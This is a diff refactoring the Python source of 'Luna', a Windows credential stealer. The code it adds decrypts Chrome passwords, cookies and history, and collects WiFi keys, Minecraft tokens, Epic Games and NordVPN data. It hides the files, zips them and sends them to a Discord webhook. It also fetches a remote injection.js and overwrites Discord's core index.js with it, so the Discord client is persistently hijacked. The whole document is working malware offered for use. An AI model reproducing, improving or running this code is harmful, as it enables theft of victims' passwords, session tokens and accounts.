@@ -1,6 +1,6 @@
 import os
 import platform
-import difflib
+import re
 import threading
 import uuid
 import requests
@@ -25,11 +25,11 @@ from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
 
-webhook = "%webhook_here%"
-ping = "%ping_enabled%"
-pingType = "%ping_type%"
+__WEBHOOK__ = "%webhook_here%"
+__PING__ = "%ping_enabled%"
+__PINGTYPE__ = "%ping_type%"
 
-def main(webhook):
+def main(webhook: str):
     global embed
 
     webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
@@ -38,7 +38,7 @@ def main(webhook):
     get_inf()
     grabtokens()
 
-    threads = [ss, grabpassword, grabcookies, grabhistory, grabwifi, grabmctokens, epicgamesdata, grabnordvpn]
+    threads = [ss, chrome, grabwifi, mc_tokens, epicgames_data, grabnordvpn]
 
     for func in threads:
         process = threading.Thread(target=func, daemon=True)
@@ -59,19 +59,28 @@ def main(webhook):
 
 
     content = ""
-    if ping == True:
-        if pingType == "everyone":
+    if __PING__ == True:
+        if __PINGTYPE__ == "everyone":
             content += "@everyone"
-        elif pingType == "here":
+        elif __PINGTYPE__ == "here":
             content += "@here"
 
     webhook.send(content=content, embed=embed, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
-
-def Luna():
+def Luna(webhook :str):
     debug()
-    main(webhook)
-    inject(webhook)
+    
+    procs = [
+        main,
+        inject,
+    ]
+    
+    for proc in procs:
+        try: 
+            proc(webhook)
+        except Exception as e:
+            print(e)
+        
     cleanup()
 
 def try_extract(func):
@@ -282,22 +291,29 @@ def ss():
     hide("desktop-screenshot.png")
 
 @try_extract
-class grabpassword():
-    def __init__(self):
-        self.appdata = os.getenv("localappdata")
-        self.roaming = os.getenv("appdata")
-
-        with open("google-passwords.txt", "w") as f:
-            f.write("https://github.com/Smug246 | Google Chrome Passwords\n\n")
-        hide(".\\google-passwords.txt")
-
-        if os.path.exists(self.appdata+'\\Google'):
-            self.grabPassword_chrome()
-
+class chrome():
+    def __init__(self) -> None:
+        self.roaming = os.getenv('APPDATA')
+        self.local = os.getenv('LOCALAPPDATA')
+        self.masterkey = self.get_master_key()
+        
+        self.google_paths = [
+            self.local + '\\Google\\Chrome\\User Data\\Default',
+            self.local + '\\Google\\Chrome\\User Data\\Profile 1',
+            self.local + '\\Google\\Chrome\\User Data\\Profile 2',
+            self.local + '\\Google\\Chrome\\User Data\\Profile 3',
+            self.local + '\\Google\\Chrome\\User Data\\Profile 4',
+            self.local + '\\Google\\Chrome\\User Data\\Profile 5',
+        ]
+        
+        self.passwords()
+        self.cookies()
+        self.history()
+        
     def get_master_key(self):
-        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
+        with open(self.local+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
             local_state = f.read()
-        local_state = loads(local_state)
+        local_state = json.loads(local_state)
 
         master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
@@ -306,103 +322,84 @@ class grabpassword():
 
     def decrypt_password(self, buff, master_key):
         try:
-            iv = buff[3:15]
-            payload = buff[15:]
+            iv, payload = buff[3:15], buff[15:]
             cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
+            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
             return decrypted_pass
         except Exception:
             return "Chrome < 80"
+    
+    def passwords(self):
+        with open(".\\google-passwords.txt", "w", encoding="utf-8") as f:
+            f.write("https://github.com/Smug246 | Google Chrome Passwords\n\n")
+            
+        for path in self.google_paths:
+            path += '\\Login Data'
+            if os.path.exists(path):
+                copy2(path, "Loginvault.db")
+                conn = sqlite3.connect("Loginvault.db")
+                cursor = conn.cursor()
+                with open(".\\google-passwords.txt", "a", encoding="utf-8") as f:
+                    for result in cursor.execute("SELECT action_url, username_value, password_value FROM logins"):
+                        url, username, password = result
+                        password = self.decrypt_password(password, self.masterkey)
+                        if url and username and password != "":
+                            f.write("Username: {:<30} | Password: {:<30} | Site: {:<30}\n".format(username, password, url))
 
-    def grabPassword_chrome(self):
-        master_key = self.get_master_key()
-
-        login_dbs = [
-            self.appdata + '\\Google\\Chrome\\User Data\\Default\\Login Data',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Login Data',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Login Data',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Login Data',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Login Data',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Login Data',
-        ]
-
-        used_login_dbs = []
-
-        for login_db in login_dbs:
-            if not os.path.exists(login_db):
-                continue
-
-            used_login_dbs.append(login_db)
-
-            try:
-                copy2(login_db, "Loginvault.db")
-            except FileNotFoundError:
-                pass
-            conn = connect("Loginvault.db")
-            cursor = conn.cursor()
-            try:
-                cursor.execute(
-                    "SELECT action_url, username_value, password_value FROM logins")
-                for r in cursor.fetchall():
-                    url = r[0]
-                    username = r[1]
-                    encrypted_password = r[2]
-                    decrypted_password = self.decrypt_password(
-                        encrypted_password, master_key)
-                    if url != "" and username != "" and decrypted_password != "":
-                        with open("google-passwords.txt", "a") as f:
-                            f.write(
-                                f"DB: {login_db}\nDomain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
-            except Exception:
-                pass
-            cursor.close()
-            conn.close()
-            try:
+                cursor.close()
+                conn.close()
                 os.remove("Loginvault.db")
-            except Exception:
-                pass
+                
+        hide("google-passwords.txt")
 
-        with open(".\\google-passwords.txt", "a") as f:
-            f.write("\n\nUsed Login Dbs:\n")
-            f.write("\n".join(used_login_dbs))
+    def cookies(self):
+        with open(".\\google-cookies.txt", "w", encoding="utf-8") as f:
+            f.write("https://github.com/Smug246 | Google Chrome Cookies\n\n")
+            
+        for path in self.google_paths:
+            path += '\\Network\\Cookies'
+            if os.path.exists(path):
+                copy2(path, "Cookievault.db")
+                conn = sqlite3.connect("Cookievault.db")
+                cursor = conn.cursor()
+                with open(".\\google-cookies.txt", "a", encoding="utf-8") as f:
+                    for result in cursor.execute("SELECT host_key, name, encrypted_value from cookies"):
+                        host, name, value = result
+                        value = self.decrypt_password(value, self.masterkey)
+                        if host and name and value != "":
+                            f.write("Site: {:<30} | Name: {:<30} | Value: {:<30}\n".format(host, name, value))
 
-@try_extract
-class grabhistory():
-    def __init__(self):
-        with open("google-history.txt", "w") as f:
+                cursor.close()
+                conn.close()
+                os.remove("Cookievault.db")
+                
+        hide("google-cookies.txt")
+    
+    def history(self):
+        with open(".\\google-history.txt", "w", encoding="utf-8") as f:
             f.write("https://github.com/Smug246 | Google Chrome History\n\n")
-        hide(".\\google-history.txt")
-
-        try:
-            username = os.getlogin()
-            dir="C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\".format(username)
-            history_db = os.path.join(dir, 'history')
-            c = sqlite3.connect(history_db)
-            cursor = c.cursor()
-            select_statement = "SELECT id,url,title FROM urls"
-            cursor.execute(select_statement)
-            results = cursor.fetchall()
-
-            ids = []
-            urls = []
-            titles = []
-            history = []
-   
-            for res in results:
-                id,url,title = res
-                history.append(f"{id} | Url: {url} | {title}")
-                ids.append(id)
-                urls.append(urls)
-                titles.append(title)
+            
+        for path in self.google_paths:
+            path += '\\History'
+            if os.path.exists(path):
+                copy2(path, "Historyvault.db")
+                conn = sqlite3.connect("Historyvault.db")
+                cursor = conn.cursor()
+                sites = []
+                with open(".\\google-history.txt", "a", encoding="utf-8") as f:
+                    for result in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls"):
+                        url, title, visit_count, last_visit_time = result
+                        if url and title and visit_count and last_visit_time != "":
+                            sites.append((url, title, visit_count, last_visit_time))
+                        sites.sort(key=lambda x: x[3], reverse=True)
+                    for site in sites:
+                        f.write("Occurrences: {:<4} | Site: {:<10}\n".format(site[2], site[1]))
+                   
+                cursor.close()
+                conn.close()
+                os.remove("Historyvault.db")
         
-            with open(".\\google-history.txt", "a") as f:
-                f.write("\nAll Google Search History:\n")
-                f.write("\n".join(history))
-        except Exception as e:
-            with open(".\\google-history.txt", "a") as f:
-                f.write(f"\nNo google history was found :(\n{e}")
-
+        hide("google-history.txt")    
 
 @try_extract
 class grabwifi:
@@ -439,147 +436,73 @@ class grabwifi:
                     f.write(f'Wifi Name : {i} | Password : {j}\n')
         f.close()
 
-@try_extract
-class grabmctokens():
+class mc_tokens():
     def __init__(self):
         self.roaming = os.getenv("appdata")
 
+        self.session_info()
+        self.user_cache()
+        
+    def session_info(self):
         with open((".\\minecraft-sessioninfo.json"), 'w', encoding="cp437", errors='ignore') as f:
-            f.write("https://github.com/Smug246 | Minecraft Accounts & Access Tokens\n\n")
-            try:
-                launcher_profiles = json.loads(open(self.roaming + "\\.minecraft\\launcher_accounts.json").read())
-                f.write(str(launcher_profiles))
-            except Exception:
+            if os.path.exists(self.roaming + "\\.minecraft\\launcher_accounts.json"):
+                with open(self.roaming + "\\.minecraft\\launcher_accounts.json", "r") as g:
+                    self.session = json.load(g)
+                    f.write(json.dumps(self.session, indent=4))
+            else:
                 f.write("No minecraft accounts or access tokens :(")
         hide(".\\minecraft-sessioninfo.json")
-
-
-
-        with open((".\\minecraft-usercache.json"), 'w', encoding="cp437", errors='ignore') as g:
-            g.write("https://github.com/Smug246 | Minecraft UUID & Display Name\n\n")
-            try:
-                usercache = json.loads(open(self.roaming + "\\.minecraft\\usercache.json").read())
-                g.write(str(usercache))
-            except Exception:
-                g.write("No minecraft uuid or display name found :(")
+    
+    def user_cache(self):
+        with open((".\\minecraft-usercache.json"), 'w', encoding="cp437", errors='ignore') as f:
+            if os.path.exists(self.roaming + "\\.minecraft\\usercache.json"):
+                with open(self.roaming + "\\.minecraft\\usercache.json", "r") as g:
+                    self.user = json.load(g)
+                    f.write(json.dumps(self.user, indent=4))
+            else:
+                f.write("No minecraft accounts or access tokens :(")
         hide(".\\minecraft-usercache.json")
 
 @try_extract
-class epicgamesdata():
+class epicgames_data():
     def __init__(self):
-        self.appdata = os.getenv("localappdata")
-
-        try:
-            with open((".\\epicgames-data.txt"), 'w', encoding="cp437", errors='ignore') as g:
-                g.write("https://github.com/Smug246 | Epic Games Offline Data\n\n")
-                g.write("Epic Games Offline Data:\n")
-
-                epic_path = (self.appdata + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini")
-                with open(epic_path, "r") as f:
-                    lines = f.readlines()
-                for line in lines:
-                    if line.startswith("Data="):
-                        eg_data = line.split('Data=')[1].strip()
-                g.write(eg_data)
-                hide(".\\epicgames-data.txt")
-        except Exception as e:
-            with open((".\\epicgames-data.txt"), 'w', encoding="cp437", errors='ignore') as g:
-                g.write("https://github.com/Smug246 | Epic Games Offline Data\n\n")
-                g.write(f"No epic games data was found :(\n{e}")
-                hide(".\\epicgames-data.txt")
+        self.local = os.getenv("localappdata")
+        self.epic = self.local + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"
+        
+        self.get_data()
+        
+    def get_data(self):
+        with open((".\\epicgames-data.txt"), 'w', encoding="cp437", errors='ignore') as g:
+            g.write("https://github.com/Smug246 | Epic Games Offline Data\n\n")
+            if os.path.exists(self.epic):
+                with open(self.epic, "r") as f:
+                    for line in f.readlines():
+                        if line.startswith("Data="):
+                            g.write(line.split('Data=')[1].strip())
+            else:
+                g.write("No epic games data was found :(")
+                
+        hide(".\\epicgames-data.txt")
 
 @try_extract
 class grabnordvpn():
-     def __init__(self):
-        self.appdata = os.getenv("localappdata")
-
-        try:
-            with open((".\\nordvpn-data.txt"), 'w', encoding="cp437", errors='ignore') as f:
-                f.write("https://github.com/Smug246 | Nord VPN Data\n\n")
-                f.write("Nord Vpn Data Found:\n")
-
-                nord_path = open((self.appdata + "\\NordVPN\\NordVPN.exe_Path_ocgnpsstpzc4lj3yc2lnr1cf1hyyhdd5\\6.35.9.0\\user.config")).read()
-                f.write(nord_path)
-                hide(".\\nordvpn-data.txt")
-        except Exception as e:
-            with open((".\\nordvpn-data.txt"), 'w', encoding="cp437", errors='ignore') as f:
-                f.write("https://github.com/Smug246 | Nord VPN Data\n\n")
-                f.write(f"No nord vpn data was found :(\n{e}")
-                hide(".\\nordvpn-data.txt")
-
-@try_extract
-class grabcookies():
     def __init__(self):
-        self.appdata = os.getenv("localappdata")
+        self.local = os.getenv("localappdata")
+        self.nord = self.local + "\\NordVPN\\NordVPN.exe_Path_ocgnpsstpzc4lj3yc2lnr1cf1hyyhdd5\\6.35.9.0\\user.config"
+                
+        self.get_data()
+        
+    def get_data(self):
+        with open((".\\nordvpn-data.txt"), 'w', encoding="cp437", errors='ignore') as f:
+            f.write("https://github.com/Smug246 | Nord VPN Data\n\n")
+            if os.path.exists(self.nord):
+                with open(self.nord, 'r') as n:
+                    f.write(n.read())
+                    
+            else: 
+                f.write(f"No nord vpn data was found :(")
 
-        with open(".\\google-cookies.txt", "w", encoding="cp437", errors='ignore') as f:
-            f.write("https://github.com/Smug246 | Google Chrome Cookies\n\n")
-        hide(".\\google-cookies.txt")
-
-        if os.path.exists(self.appdata+'\\Google'):
-            self.grabCookies_Chrome()
-
-    def get_master_key(self, path) -> str:
-        with open(path, "r", encoding="utf-8") as f:
-            c = f.read()
-        local_state = loads(c)
-
-        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-        master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        return master_key
-
-    def decrypt_val(self, buff, master_key) -> str:
-        try:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
-            return decrypted_pass
-        except Exception:
-            return "Failed to decrypt password"
-
-    def grabCookies_Chrome(self):
-        master_key = self.get_master_key(
-            self.appdata+'\\Google\\Chrome\\User Data\\Local State')
-
-        login_dbs = [
-            self.appdata + '\\Google\\Chrome\\User Data\\Default\\Network\\cookies',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\cookies',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\cookies',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\cookies',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\cookies',
-            self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\cookies',
-        ]
-
-        used_login_dbs = []
-
-        for login_db in login_dbs:
-            if not os.path.exists(login_db):
-                continue
-            used_login_dbs.append(login_db)
-            login = ".\\Loginvault2.db"
-            copy2(login_db, login)
-            conn = connect(login)
-            cursor = conn.cursor()
-            with open(".\\google-cookies.txt", "a", encoding="cp437", errors='ignore') as f:
-                cursor.execute(
-                    "SELECT host_key, name, encrypted_value from cookies")
-                for r in cursor.fetchall():
-                    host = r[0]
-                    user = r[1]
-                    decrypted_cookie = self.decrypt_val(r[2], master_key)
-                    if host != "":
-                        f.write(
-                            f"DB: {login_db}\nHost: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
-            cursor.close()
-            conn.close()
-            os.remove(login)
-
-        with open(".\\google-cookies.txt", "a") as f:
-            f.write("\n\nUsed Login Dbs:\n")
-            f.write("\n".join(used_login_dbs))
+        hide(".\\nordvpn-data.txt")
 
 def zipup():
     with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
@@ -613,18 +536,50 @@ def cleanup():
 def hide(file):
     SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
 
-def inject():
-    appdata = os.getenv("localappdata")
-    for _dir in os.listdir(appdata):
-        if 'discord' in _dir.lower():
-            for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
-                if match(r'app-(\d*\.\d*)*', __dir):
-                    abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
-                    f = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Grabber-Builder/main/injection.js").text.replace("%WEBHOOK%", webhook)
-                    modules_dir = os.listdir(abspath+'\\modules') 
-                    with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
-                        indexFile.write(f)
-                    subprocess.call(["start", abspath+os.sep+"Discord.exe"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+class inject:
+    def __init__(self, webhook: str):
+        self.appdata = os.getenv('LOCALAPPDATA')
+        self.discord_dirs = [
+            self.appdata + '\\Discord', 
+            self.appdata + '\\DiscordCanary', 
+            self.appdata + '\\DiscordPTB', 
+            self.appdata + '\\DiscordDevelopment'
+        ]
+        self.code = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Grabber-Builder/main/injection.js").text
+            
+        for dir in self.discord_dirs:
+            if not os.path.exists(dir): continue    
+            
+            if self.get_core(dir) is not None:
+                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
+                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
+                    self.start_discord(dir)
+            
+    def get_core(self, dir: str):
+        for file in os.listdir(dir):
+            if re.search(r'app-+?', file):
+                modules = dir + '\\' + file + '\\modules'
+                if not os.path.exists(modules): continue
+                for file in os.listdir(modules):
+                    if re.search(r'discord_desktop_core-+?', file):
+                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
+                        if not os.path.exists(core + '\\index.js'): 
+                            continue
+                        
+                        return core, file
+                    
+    def start_discord(self, dir: str):
+        update = dir + '\\Update.exe'
+        executable = dir.split('\\')[-1] + '.exe'
+        
+        for file in os.listdir(dir):
+            if re.search(r'app-+?', file):
+                app = dir + '\\' + file
+                if os.path.exists(app + '\\' + 'modules'):
+                    for file in os.listdir(app):
+                        if file == executable:
+                            executable = app + '\\' + executable
+                            subprocess.call([update, '--processStart', executable], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 class debug:
     def __init__(self):
@@ -695,11 +650,4 @@ class debug:
         exit()
 
 if __name__ == '__main__' and os.name == "nt":
-    try:
-        debug()
-        Luna()
-    except Exception:
-        try:
-            cleanup()
-        except Exception:
-            exit()
+    Luna(__WEBHOOK__)
